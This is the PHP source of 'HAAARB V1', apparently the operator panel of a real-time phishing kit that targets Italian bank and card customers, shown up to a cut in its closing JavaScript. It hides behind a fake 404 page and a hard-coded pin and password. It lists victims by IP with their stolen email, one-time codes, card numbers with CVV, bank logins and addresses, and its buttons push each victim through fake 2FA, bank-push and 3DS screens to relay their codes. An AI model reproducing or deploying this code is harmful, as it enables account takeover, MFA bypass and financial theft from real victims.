<?php
require_once __DIR__ . '/guard.php';

$password = "mama";
$panel_key = 'hello';

if (isset($_GET['pin']) && $_GET['pin'] === $panel_key) {
    $_SESSION['pin_ok'] = true;
    header('Location: ' . str_replace('?pin=' . $panel_key, '', $_SERVER['REQUEST_URI']));
    exit;
}

if (!isset($_SESSION['pin_ok']) || $_SESSION['pin_ok'] !== true) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
}

if (isset($_POST['p']) && $_POST['p'] == $password) { $_SESSION['a'] = true; }
if (!isset($_SESSION['a'])) {
    exit('<body style="background:#0f111a;display:flex;align-items:center;justify-content:center;height:100vh;"><form method="POST" style="background:#161b22;padding:40px;border-radius:20px;border:1px solid #30363d;"><h2 style="color:white;text-align:center;font-family:sans-serif;">HAAARB V1</h2><input type="password" name="p" placeholder="Password" style="background:#0d1117;border:1px solid #30363d;padding:15px;color:white;border-radius:10px;"><button style="background:#388bfd;color:white;border:none;padding:15px 25px;border-radius:10px;margin-left:10px;cursor:pointer;">Login</button></form></body>');
}

$dbFile = 'status.json';
$db = json_decode(@file_get_contents($dbFile), true) ?: [];

// Auto-cleanup entries older than 2 hours
$changed = false;
foreach ($db as $ip => $entry) {
    if (time() - ($entry['last_seen'] ?? 0) > 7200) {
        unset($db[$ip]);
        $changed = true;
    }
}
if ($changed) file_put_contents($dbFile, json_encode($db));

// Handle panel actions
if (isset($_GET['action'], $_GET['ip'])) {
    $ip = $_GET['ip'];
    if ($_GET['action'] === 'reset') {
        // Complete wipe — remove victim entirely from status.json
        if (isset($db[$ip])) {
            unset($db[$ip]);
            file_put_contents($dbFile, json_encode($db));
        }
    } elseif (isset($db[$ip])) {
        $db[$ip]['status'] = $_GET['action'];
        $db[$ip]['panel_action_time'] = time();
        file_put_contents($dbFile, json_encode($db));
    }
    // If AJAX request, return JSON
    if (isset($_GET['ajax'])) {
        header('Content-Type: application/json');
        echo json_encode(['ok' => true]);
        exit;
    }
    header("Location: panel.php?view=" . urlencode($ip));
    exit;
}

// AJAX: return sidebar HTML + stats
if (isset($_GET['ajax_sidebar'])) {
    header('Content-Type: application/json');
    $victims = [];
    foreach (array_reverse($db, true) as $ip => $u) {
        $victims[] = [
            'ip' => $ip,
            'status' => $u['status'] ?? 'online',
            'label' => statusLabel($u['status'] ?? 'online'),
            'color' => statusColor($u['status'] ?? 'online'),
            'online' => (time() - ($u['last_seen'] ?? 0) < 30),
            'email' => $u['email'] ?? '',
            'last_code' => $u['last_code'] ?? '',
            'ago' => timeAgo($u['last_seen'] ?? 0)
        ];
    }
    echo json_encode(['victims' => $victims, 'count' => count($db), 'online_count' => count(array_filter($db, fn($e) => time() - ($e['last_seen'] ?? 0) < 30))]);
    exit;
}

// AJAX: return full victim data for active IP
if (isset($_GET['ajax_data']) && isset($_GET['ip'])) {
    header('Content-Type: application/json');
    $ip = $_GET['ip'];
    if (isset($db[$ip])) {
        $v = $db[$ip];
        $v['label'] = statusLabel($v['status'] ?? 'online');
        $v['color'] = statusColor($v['status'] ?? 'online');
        $v['ago'] = timeAgo($v['last_seen'] ?? 0);
        echo json_encode($v);
    } else {
        echo json_encode(null);
    }
    exit;
}

function statusLabel($s) {
    $map = [
        'online' => '🟢 Online', 'login_submitted' => '📧 Login Submitted',
        'go_email' => '📧 Email 2FA', 'code_EMAIL' => '🔢 Email Code',
        'go_sms' => '📱 SMS 2FA', 'code_SMS' => '🔢 SMS Code',
        'go_mfa' => '🛡 MFA', 'code_MFA' => '🔢 MFA Code',
        'go_verify' => '🆔 Verify ID', 'verify_identity_confirmed' => '✅ ID Confirmed',
        'go_bank' => '🏦 Bank List', 'bank_selected' => '🏛 Bank Selected',
        'bank_login_submitted' => '🔐 Bank Login', 'bank_push_pending' => '📱 Push Pending',
        'bank_push_approved' => '✅ Push Approved', 'bank_push_approve' => '✅ Push OK',
        'bank_success' => '🏁 Bank Done', 'bank_login_error' => '❌ Login Err',
        'bank_sms_error' => '❌ SMS Err', 'bank_sms_otp_submitted' => '💬 Bank SMS',
        'bank_redirect_viewed' => '🔄 Redirect', 'go_card' => '💳 Card Form',
        'go_card_force' => '💳→Card', 'go_bank_force' => '🏦→Bank',
        'go_billing' => '📍→Billing', 'billing_submitted' => '📍 Billing Done', 'billing_error' => '❌ Billing Err',
        'card_submitted' => '💳 Card Sent', 'go_3ds' => '🔒 3DS',
        'verify_app_push_clicked' => '📱 3DS Push', 'sms_verify_clicked' => '💬 3DS SMS',
        'sms_otp_submitted' => '🔢 3DS OTP', 'finished' => '🏁 Done',
        'finished_success' => '🎉 Success', 'otp_error' => '❌ OTP Err',
        'mfa_error' => '❌ MFA Err', 'card_error' => '❌ Card Err',
        'sms_otp_error' => '❌ 3DS SMS Err', 'verify_app_approve' => '✅ 3DS OK',
        'reset' => '🔄 Reset', 'block' => '🚫 Blocked'
    ];
    return $map[$s] ?? '📌 ' . strtoupper($s);
}

function statusColor($s) {
    if (strpos($s, 'error') !== false || strpos($s, 'block') !== false) return 'red';
    if (strpos($s, 'success') !== false || strpos($s, 'finished') !== false || strpos($s, 'approve') !== false) return 'green';
    if (strpos($s, 'go_') === 0 || strpos($s, 'bank_') === 0 || strpos($s, 'card') !== false) return 'blue';
    if (strpos($s, 'code_') === 0 || strpos($s, 'otp') !== false || strpos($s, 'login') !== false) return 'yellow';
    return 'slate';
}

function timeAgo($ts) {
    $diff = time() - $ts;
    if ($diff < 10) return 'just now';
    if ($diff < 60) return $diff . 's ago';
    if ($diff < 3600) return floor($diff / 60) . 'm ago';
    return floor($diff / 3600) . 'h ago';
}

$active_ip = $_GET['view'] ?? (count($db) > 0 ? array_key_first(array_reverse($db, true)) : null);
?>
<!DOCTYPE html>
<html>
<head>
    <title>HAAARB CONTROL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .fade-in { animation: fadeIn 0.3s ease-in; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
        .pulse-new { animation: pulseNew 0.6s ease-in-out 3; }
        @keyframes pulseNew { 0%,100% { background-color: transparent; } 50% { background-color: rgba(59,130,246,0.2); } }
    </style>
</head>
<body class="bg-[#0f111a] text-slate-400 flex h-screen overflow-hidden">

    <!-- SIDEBAR -->
    <div class="w-80 bg-[#161b22] border-r border-[#30363d] overflow-y-auto p-4 flex flex-col">
        <div class="flex justify-between items-center mb-4">
            <h1 class="text-white font-black italic text-xl">HAAARB V1</h1>
            <div class="flex gap-1 text-[10px]">
                <span id="total-count" class="bg-slate-800 px-2 py-1 rounded text-slate-300"><?php echo count($db); ?></span>
                <span id="online-count" class="bg-green-900 px-2 py-1 rounded text-green-400"><?php echo count(array_filter($db, fn($e) => time() - ($e['last_seen'] ?? 0) < 30)); ?></span>
            </div>
        </div>
        <div id="sidebar-victims" class="flex-1 space-y-1">
            <?php foreach(array_reverse($db, true) as $ip => $u):
                $online = (time() - ($u['last_seen'] ?? 0) < 30);
                $color = statusColor($u['status'] ?? 'online');
                $colorMap = ['green'=>'bg-green-500','red'=>'bg-red-500','blue'=>'bg-blue-500','yellow'=>'bg-yellow-500','slate'=>'bg-slate-500'];
                $dotColor = $online ? $colorMap[$color] : 'bg-slate-700';
            ?>
            <a href="?view=<?php echo urlencode($ip); ?>" class="victim-row block p-3 rounded-xl border <?php echo ($active_ip==$ip)?'border-blue-500 bg-blue-500/10':'border-slate-800'; ?> hover:border-slate-600 transition" data-ip="<?php echo $ip; ?>">
                <div class="flex justify-between items-center mb-1">
                    <span class="text-white text-xs font-mono"><?php echo $ip; ?></span>
                    <div class="w-2 h-2 rounded-full <?php echo $dotColor . ($online ? ' animate-pulse' : ''); ?>"></div>
                </div>
                <div class="text-[10px] font-bold uppercase" style="color: <?php echo $color === 'green' ? '#4ade80' : ($color === 'red' ? '#f87171' : ($color === 'blue' ? '#60a5fa' : ($color === 'yellow' ? '#fbbf24' : '#94a3b8'))); ?>">
                    <?php echo statusLabel($u['status'] ?? 'online'); ?>
                </div>
                <div class="text-[9px] text-slate-600 mt-0.5"><?php echo timeAgo($u['last_seen'] ?? 0); ?></div>
            </a>
            <?php endforeach; ?>
            <?php if (count($db) === 0): ?>
            <div class="text-center text-slate-600 text-xs py-8">No victims yet</div>
            <?php endif; ?>
        </div>
    </div>

    <!-- MAIN PANEL -->
    <div class="flex-grow p-6 bg-[#0d1117] overflow-y-auto" id="main-panel">
        <?php if($active_ip && isset($db[$active_ip])): $v = $db[$active_ip]; ?>
            <div class="max-w-4xl mx-auto">
                <!-- STATUS HEADER -->
                <div class="flex items-center justify-between mb-4" id="status-header">
                    <div>
                        <div class="text-white font-bold text-lg"><?php echo htmlspecialchars($active_ip); ?></div>
                        <div class="text-xs text-slate-500"><?php echo statusLabel($v['status'] ?? 'online'); ?> · <?php echo timeAgo($v['last_seen'] ?? 0); ?></div>
                    </div>
                    <button onclick="copyVictimData()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-2 rounded-lg text-xs transition"><i class="fas fa-copy mr-1"></i> Copy Data</button>
                </div>

                <!-- LIVE DATA -->
                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800 mb-4 shadow-2xl">
                    <div class="grid grid-cols-2 gap-4">
                        <div class="col-span-2 text-center">
                            <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-2">Last Captured Code</div>
                            <div class="text-5xl font-black text-blue-500 tracking-[10px]"><?php echo $v['last_code'] ?: '------'; ?></div>
                            <div class="text-sm font-mono text-slate-400 mt-1"><?php echo htmlspecialchars($v['email'] ?? ''); ?></div>
                        </div>
                        <div id="card-data-section">
                        <?php if(isset($v['card_name'])): ?>
                        <div class="col-span-2 bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Banca Emittente</span><span class="text-green-400 font-mono text-sm"><?php echo htmlspecialchars($v['card_bank'] ?? 'N/A'); ?></span> <span class="text-slate-600 text-[10px] ml-2"><?php echo htmlspecialchars(strtoupper($v['card_brand'] ?? '')); ?> BIN: <?php echo htmlspecialchars($v['card_bin'] ?? ''); ?></span></div>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Titolare</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['card_name']); ?></span></div>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Numero</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['card_number']); ?></span></div>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Scadenza</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['card_expiry']); ?></span></div>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">CVV</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['card_cvv']); ?></span></div>
                        <?php endif; ?>
                        </div>
                        <div id="bank-data-section">
                        <?php if(isset($v['selected_bank'])): ?>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Banca</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['selected_bank']); ?></span></div>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">ID Banca</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['selected_bank_id'] ?? 'N/A'); ?></span></div>
                        <?php if(isset($v['selected_branch'])): ?>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Branch</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['selected_branch']); ?></span></div>
                        <?php endif; ?>
                        <?php if(isset($v['bank_username'])): ?>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Bank Username</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['bank_username']); ?></span></div>
                        <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Bank Password</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['bank_password']); ?></span></div>
                        <?php endif; ?>
                        <?php endif; ?>
                        </div>
                        <div id="billing-data-section">
                        <?php if(isset($v['billing_address'])): ?>
                        <div class="mt-4 pt-4 border-t border-slate-800 text-left">
                            <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-3">📍 Billing — <?php echo htmlspecialchars(($v['billing_firstname'] ?? '') . ' ' . ($v['billing_lastname'] ?? '')); ?></div>
                            <div class="grid grid-cols-2 gap-3 text-sm">
                                <div class="col-span-2 bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Indirizzo</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['billing_address']); ?></span></div>
                                <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Città</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['billing_city']); ?></span></div>
                                <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">CAP</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['billing_zip']); ?></span></div>
                                <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Provincia</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['billing_province'] ?? $v['billing_state'] ?? 'N/A'); ?></span></div>
                                <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Paese</span><span class="text-white font-mono text-sm">🇮🇹 <?php echo htmlspecialchars($v['billing_country'] ?? 'Italia'); ?></span></div>
                                <div class="bg-slate-800/50 p-3 rounded-xl"><span class="text-slate-500 block text-[10px]">Telefono</span><span class="text-white font-mono text-sm"><?php echo htmlspecialchars($v['billing_phone']); ?></span></div>
                            </div>
                        </div>
                        <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- CONTROL BUTTONS -->
                <div id="control-buttons">
                <div class="mb-4">
                    <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-2">📄 Auth Steps</div>
                    <div class="grid grid-cols-5 gap-2">
                        <a href="?action=go_email&ip=<?php echo $active_ip; ?>" class="bg-blue-600 hover:bg-blue-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-envelope block mb-1 text-base"></i> EMAIL 2FA</a>
                        <a href="?action=go_sms&ip=<?php echo $active_ip; ?>" class="bg-purple-600 hover:bg-purple-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-sms block mb-1 text-base"></i> SMS 2FA</a>
                        <a href="?action=go_mfa&ip=<?php echo $active_ip; ?>" class="bg-orange-600 hover:bg-orange-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-shield-alt block mb-1 text-base"></i> MFA</a>
                        <a href="?action=go_verify&ip=<?php echo $active_ip; ?>" class="bg-pink-600 hover:bg-pink-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-id-card block mb-1 text-base"></i> IDENTITY</a>
                        <a href="?action=go_bank&ip=<?php echo $active_ip; ?>" class="bg-rose-600 hover:bg-rose-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-list block mb-1 text-base"></i> BANK LIST</a>
                    </div>
                </div>

                <div class="mb-4">
                    <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-2">🔀 Routing</div>
                    <div class="grid grid-cols-3 gap-2">
                        <a href="?action=go_card_force&ip=<?php echo $active_ip; ?>" class="bg-cyan-500 hover:bg-cyan-600 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-credit-card block mb-1 text-base"></i> GO TO CARD</a>
                        <a href="?action=go_bank_force&ip=<?php echo $active_ip; ?>" class="bg-rose-500 hover:bg-rose-600 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-building-columns block mb-1 text-base"></i> GO TO BANK LIST</a>
                        <a href="?action=go_billing&ip=<?php echo $active_ip; ?>" class="bg-violet-500 hover:bg-violet-600 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-map-location-dot block mb-1 text-base"></i> GO TO BILLING</a>
                    </div>
                </div>

                <div class="mb-4">
                    <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-2">❌ Errors</div>
                    <div class="grid grid-cols-5 gap-2">
                        <a href="?action=otp_error&ip=<?php echo $active_ip; ?>" class="bg-red-600/20 text-red-400 border border-red-600/30 p-3 rounded-xl text-center font-bold text-[10px] transition hover:bg-red-600/30 action-btn"><i class="fas fa-times-circle block mb-1 text-base"></i> EMAIL/SMS ERR</a>
                        <a href="?action=mfa_error&ip=<?php echo $active_ip; ?>" class="bg-red-600/20 text-red-400 border border-red-600/30 p-3 rounded-xl text-center font-bold text-[10px] transition hover:bg-red-600/30 action-btn"><i class="fas fa-shield-times block mb-1 text-base"></i> MFA ERR</a>
                        <a href="?action=card_error&ip=<?php echo $active_ip; ?>" class="bg-yellow-600/20 text-yellow-400 border border-yellow-600/30 p-3 rounded-xl text-center font-bold text-[10px] transition hover:bg-yellow-600/30 action-btn"><i class="fas fa-exclamation-triangle block mb-1 text-base"></i> CARD DATA ERR</a>
                        <a href="?action=billing_error&ip=<?php echo $active_ip; ?>" class="bg-violet-600/20 text-violet-400 border border-violet-600/30 p-3 rounded-xl text-center font-bold text-[10px] transition hover:bg-violet-600/30 action-btn"><i class="fas fa-map-pin block mb-1 text-base"></i> BILLING ERR</a>
                        <a href="?action=sms_otp_error&ip=<?php echo $active_ip; ?>" class="bg-amber-600/20 text-amber-400 border border-amber-600/30 p-3 rounded-xl text-center font-bold text-[10px] transition hover:bg-amber-600/30 action-btn"><i class="fas fa-comment-slash block mb-1 text-base"></i> 3DS SMS ERR</a>
                    </div>
                </div>

                <div class="mb-4">
                    <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-2">🏦 Bank Gateway</div>
                    <div class="grid grid-cols-5 gap-2">
                        <a href="?action=bank_push_pending&ip=<?php echo $active_ip; ?>" class="bg-blue-600 hover:bg-blue-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-paper-plane block mb-1 text-base"></i> SHOW PUSH</a>
                        <a href="?action=bank_login_error&ip=<?php echo $active_ip; ?>" class="bg-red-700 hover:bg-red-800 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-user-xmark block mb-1 text-base"></i> LOGIN ERR</a>
                        <a href="?action=bank_push_approve&ip=<?php echo $active_ip; ?>" class="bg-green-600 hover:bg-green-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-mobile-screen block mb-1 text-base"></i> PUSH APPROVE</a>
                        <a href="?action=bank_sms_error&ip=<?php echo $active_ip; ?>" class="bg-amber-600 hover:bg-amber-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-comment-slash block mb-1 text-base"></i> SMS ERR</a>
                        <a href="?action=bank_success&ip=<?php echo $active_ip; ?>" class="bg-emerald-600 hover:bg-emerald-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-check-double block mb-1 text-base"></i> SUCCESS</a>
                    </div>
                </div>

                <div class="mb-4">
                    <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-2">💳 Final</div>
                    <div class="grid grid-cols-5 gap-2">
                        <a href="?action=go_3ds&ip=<?php echo $active_ip; ?>" class="bg-indigo-600 hover:bg-indigo-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-lock block mb-1 text-base"></i> 3DS PAGE</a>
                        <a href="?action=verify_app_approve&ip=<?php echo $active_ip; ?>" class="bg-teal-600 hover:bg-teal-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-bell-check block mb-1 text-base"></i> 3DS PUSH OK</a>
                        <a href="?action=finished&ip=<?php echo $active_ip; ?>" class="bg-emerald-500 hover:bg-emerald-600 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-flag-checkered block mb-1 text-base"></i> FINISH</a>
                        <a href="?action=reset&ip=<?php echo $active_ip; ?>" class="bg-slate-500 hover:bg-slate-600 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-rotate-left block mb-1 text-base"></i> RESET</a>
                        <a href="?action=block&ip=<?php echo $active_ip; ?>" class="bg-gray-600 hover:bg-gray-700 text-white p-3 rounded-xl text-center font-bold text-[10px] transition action-btn"><i class="fas fa-ban block mb-1 text-base"></i> BLOCK</a>
                    </div>
                </div>
                </div>
            </div>
        <?php else: ?>
            <div class="h-full flex items-center justify-center opacity-10 text-4xl font-black uppercase tracking-[20px]">Select Victim</div>
        <?php endif; ?>
    </div>

    <!-- Hidden audio element for alerts -->
    <audio id="alert-sound" preload="auto" style="display:none;">
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACAf39/f4B/f3+AgH9/f3+Af39/gIB/f39/gH9/f4CAf39/f4B/f3+AgH9/f3+Af39/gIB/f39/gH9/f4B/f39/gIB/f3+AgH9/f3+Af39/gH9/f4B/f39/gH9/f4CAf39/f4B/f39/gH9/f4B/f3+Af39/gIB/f39/gIB/f39/gIB/f39/gH9/f4B/f3+AgH9/f4B/f39/gIB/f3+Af39/gH9/f4B/f3+AgH9/f4B/f39/gH9/f4B/f3+Af39/gIB/f39/gH9/gIB/f3+AgH9/f39/gH9/f4B/f3+AgH9/f4B/f39/gH9/f4B/f39/gH9/f4B/f3+AgH9/f4CAf39/gIB/f39/gH9/gIB/f3+Af39/gIB/f39/gH9/f4B/f3+AgH9/f4B/f3+AgH9/f39/f4CAf39/f39/gH9/f39/gIB/f39/f4CAf39/f3+Af39/f4CAf39/f3+AgH9/f39/gH9/f39/gIB/f39/f4B/f39/gIB/f39/f3+Af39/f4CAf39/f39/gH9/f39/gIB/f39/f3+AgH9/f39/gH9/f39/gIB/f39/f4CAf39/f4CAf39/f4CAf39/f4B/f39/gH9/f4CAf39/gIB/f39/f4CAf39/gIB/f39/gH9/f39/gIB/f39/f3+Af39/f39/gH9/f39/gIB/f39/f4CAf39/f4B/f39/f3+AgH9/f39/gH9/f39/f4CAf39/f4B/f39/gIB/f39/f4B/f39/gH9/f39/gH9/f39/gIB/f39/f4B/f39/f4B/f39/f3+Af39/f39/gH9/f39/gIB/f39/f4CAf39/f3+AgH9/f39/gH9/f39/gIB/f39/f39/gH9/f39/f4B/f39/f39/gIB/f39/f4CAf39/f39/gH9/f3+Af39/f3+Af39/f3+Af39/f3+Af39/f3+Af39/f39/gIB/f39/f3+Af39/f3+Af39/f3+Af39/f3+Af39/f39/gIB/f39/f4CAf39/f39/gH9/f3+Af39/f39/gIB/f39/f3+Af39/f39/gIB/f39/f4B/f39/f3+Af39/f3+Af39/f39/gH9/f3+AgH9/f39/gH9/f3+AgH9/f39/f3+AgH9/f39/gH9/f39/f3+AgH9/f39/gH9/f39/f3+AgH9/f39/gH9/f39/f4CAf39/f39/f4CAf39/f39/gH9/f39/f3+Af39/f39/f4B/f39/f39/gH9/f39/f4B/f39/f39/gH9/f3+Af4B/f3+AgH9/f3+AgH9/f3+AgH9/f39/gH9/f39/gH9/f39/f4B/f39/f39/gH9/f3+Af39/f39/f4B/f39/f39/gH9/f39/f4B/f39/f3+Af39/f3+Af39/f39/gH9/f39/gH9/f39/f4B/f39/f39/gH9/f39/gH9/f39/f4B/f39/f39/gH9/f3+Af39/f39/gH9/f3+AgH9/f3+AgH9/f3+AgH9/f39/gH9/f39/f4B/f3+Af4B/f39/f39/f39/gH9/f39/f3+Af39/f39/gH9/f39/f39/gH9/f3+Af39/f39/f4B/f39/f39/f4CAf39/f39/f4B/f39/f39/gH9/f39/f4B/f39/f39/f4B/f3+Af4B/f39/f4B/f39/f3+Af39/f3+Af39/f39/f39/gH9/f39/f4B/f39/f4B/f39/f4CAf39/f4B/f3+Af4B/f3+Af4B/f39/f4B/f3+Af4B/f39/f4B/f3+Af4B/f39/f4B/f3+Af4B/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/f3+Af39/f3+Af39/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/gH9/f39/f39/f4B/f39/f3+Af39/f39/f3+Af39/f39/f3+Af39/f39/f3+Af39/f39/f4B/f39/f39/f4B/f39/f39/f4B/f39/f39/f4B/f39/f39/f3+Af39/f39/f4B/f39/f39/f4B/f39/f39/f4B/f39/f3+Af39/f3+AgH9/f3+AgH9/f3+AgH9/f3+Af39/f3+Af39/f3+Af39/f3+AgH9/f3+AgH9/f3+AgH9/f3+Af4B/f3+Af4CAf39/f3+Af4B/f39/f3+AgH9/f3+AgH9/f3+AgH9/f3+Af4B/f3+Af4B/f3+Af4B/f3+Af4B/f3+Af4CAf39/f4B/f3+Af4B/f3+Af4CAf39/f4B/f3+Af4CAf39/f4CAf39/f4CAf39/f4B/f3+AgIB/f3+AgH9/f39/f4CAf4B/f3+AgH9/f4CAf39/f4CAf4B/f3+AgH9/gIB/f3+AgH9/gH9/f4CAf4B/f3+Af4B/f3+AgH9/gH9/gH9/gH9/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/f4B/g==" type="audio/wav">
    </audio>

    <script>
    // ============ SOUND ALERT ============
    let lastKnownCodes = {};
    let lastKnownCards = {};
    let lastKnownBanks = {};

    function playAlert() {
        try { document.getElementById('alert-sound').play(); } catch(e) {}
    }

    function checkForNewData(data) {
        if (!data || !data.victims) return;
        data.victims.forEach(v => {
            const prev = lastKnownCodes[v.ip] || '';
            const cur = v.last_code || '';
            if (cur && cur !== '------' && cur !== prev) {
                playAlert();
            }
            lastKnownCodes[v.ip] = cur;
        });
    }

    // ============ AJAX SIDEBAR REFRESH ============
    function refreshSidebar() {
        fetch('panel.php?ajax_sidebar=1')
            .then(r => r.json())
            .then(data => {
                checkForNewData(data);
                document.getElementById('total-count').innerText = data.count;
                document.getElementById('online-count').innerText = data.online_count;

                const container = document.getElementById('sidebar-victims');
                const currentActive = new URLSearchParams(window.location.search).get('view') || '';

                if (data.victims.length === 0) {
                    container.innerHTML = '<div class="text-center text-slate-600 text-xs py-8">No victims yet</div>';
                    return;
                }

                const colorMap = {green:'bg-green-500',red:'bg-red-500',blue:'bg-blue-500',yellow:'bg-yellow-500',slate:'bg-slate-500'};
                const textColorMap = {green:'#4ade80',red:'#f87171',blue:'#60a5fa',yellow:'#fbbf24',slate:'#94a3b8'};

                container.innerHTML = data.victims.map(v => {
                    const isActive = (v.ip === currentActive);
                    const dotAnim = v.online ? ' animate-pulse' : '';
                    const dotColor = colorMap[v.color] || 'bg-slate-700';
                    const txtColor = textColorMap[v.color] || '#94a3b8';
                    const activeBorder = isActive ? 'border-blue-500 bg-blue-500/10' : 'border-slate-800';
                    return `<a href="?view=${encodeURIComponent(v.ip)}" class="victim-row block p-3 rounded-xl border ${activeBorder} hover:border-slate-600 transition fade-in" data-ip="${v.ip}">
                        <div class="flex justify-between items-center mb-1">
                            <span class="text-white text-xs font-mono">${v.ip}</span>
                            <div class="w-2 h-2 rounded-full ${dotColor}${dotAnim}"></div>
                        </div>
                        <div class="text-[10px] font-bold uppercase" style="color:${txtColor}">${v.label}</div>
                        <div class="text-[9px] text-slate-600 mt-0.5">${v.ago}</div>
                    </a>`;
                }).join('');
            })
            .catch(() => {});
    }

    // ============ COPY VICTIM DATA ============
    function copyVictimData() {
        const ip = '<?php echo $active_ip; ?>';
        fetch('panel.php?ajax_data=1&ip=' + encodeURIComponent(ip))
            .then(r => r.json())
            .then(data => {
                const text = JSON.stringify(data, null, 2);
                navigator.clipboard.writeText(text).then(() => {
                    alert('Victim data copied to clipboard!');
                }).catch(() => {
                    // Fallback
                    const ta = document.createElement('textarea');
                    ta.value = text;
                    document.body.appendChild(ta);
                    ta.select();
                    document.execCommand('copy');
                    ta.remove();
                });
            });
    }

    // ============ ACTION BUTTONS (click without page reload) ============
    document.addEventListener('click', function(e) {
        const btn = e.target.closest('.action-btn');
        if (!btn) return;
        e.preventDefault();
        const href = btn.getAttribute('href');
        // Add ajax param
        const url = href + '&ajax=1';
        fetch(url).then(() => {
            // Brief flash to confirm
            btn.style.opacity = '0.5';
            setTimeout(() => { btn.style.opacity = '1'; refreshSidebar(); }, 200);
        });
    });

    // ============ AUTO-REFRESH MAIN DATA PANEL ============
    let currentViewIP = '<?php echo $active_ip; ?>';
    let lastDataHash = '';

    function refreshMainPanel() {
        if (!currentViewIP) return;
        fetch('panel.php?ajax_data=1&ip=' + encodeURIComponent(currentViewIP))
